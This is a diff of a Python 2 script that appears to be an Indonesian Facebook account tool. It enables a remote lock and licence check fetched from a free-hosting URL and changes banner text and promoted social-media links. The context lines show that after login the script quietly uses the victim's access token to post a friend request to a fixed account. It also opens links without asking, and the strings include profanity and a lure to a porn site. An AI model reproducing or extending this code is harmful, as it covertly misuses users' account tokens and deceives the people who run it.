@@ -91,7 +91,7 @@ vuln = '\x1b[32mVuln'
 
 def lisensi():
     os.system('reset')
-    print 'Ini program ilegal,\nCeue tepod jangan pake program ini,\nntar tervully nangid :(\n'
+    print 'Pengen tau user passnya?,\nakses dulu web xnxx.com,\habis akses lu tau user passnya :)\n'
     username = raw_input('[*] Username : ')
     passw = raw_input('[*] Password : ')
     r = requests.get('https://reddemons.000webhostapp.com/manusia1.7/password.txt').text
@@ -121,7 +121,7 @@ def lisensi():
 def masuk():
     os.system('reset')
     print logo
-    print bgm +'       Decompile By Ahmad Riswanto        \x1b[40m'
+    print bgm +'Jika Fb anda terkena checkpoint login di browser dulu cuy\x1b[40m'
     print '\x1b[1;97m\xe2\x95\x91--\x1b[1;91m> \x1b[1;92m1.\x1b[1;97m Login'
     print '\x1b[1;97m\xe2\x95\x91--\x1b[1;91m> \x1b[1;92m2.\x1b[1;97m Login using token'
     print '\x1b[1;97m\xe2\x95\x91--\x1b[1;91m> \x1b[1;91m0.\x1b[1;97m Exit'
@@ -185,7 +185,7 @@ def login():
                 zedd.close()
                 print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin successfully'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open https://www.instagram.com/rezadkim')
+                os.system('xdg-open https://www.instagram.com/zhlnt')
                 menu()
             except requests.exceptions.ConnectionError:
                 print '\n\x1b[1;91m[!] No connection'
@@ -309,7 +309,7 @@ def pilih():
                                 else:
                                     if zedd == '8':
                                         os.system('rm -rf login.txt')
-                                        os.system('xdg-open https://www.youtube.com/nganunymous')
+                                        os.system('xdg-open https://www.instagram.com/zhlnt')
                                         keluar()
                                     else:
                                         if zedd == '0':
@@ -2774,10 +2774,9 @@ def gaz(toket, enable=True):
 
 
 if __name__ == '__main__':
-    # r = requests.get('https://reddemons.000webhostapp.com/manusia1.7/lock.txt').text
-    # if 'tutup' in r:
-    #     print '\x1b[1;91m[!] Locked kontol loe semua'
-    #     keluar()
-    # elif 'buka' in r:
-    #     lisensi()
-    masuk()
+     r = requests.get('https://reddemons.000webhostapp.com/manusia1.7/lock.txt').text
+     if 'tutup' in r:
+         print '\x1b[1;91m[!] Locked kontol loe semua'
+         keluar()
+     elif 'buka' in r:
+         lisensi()
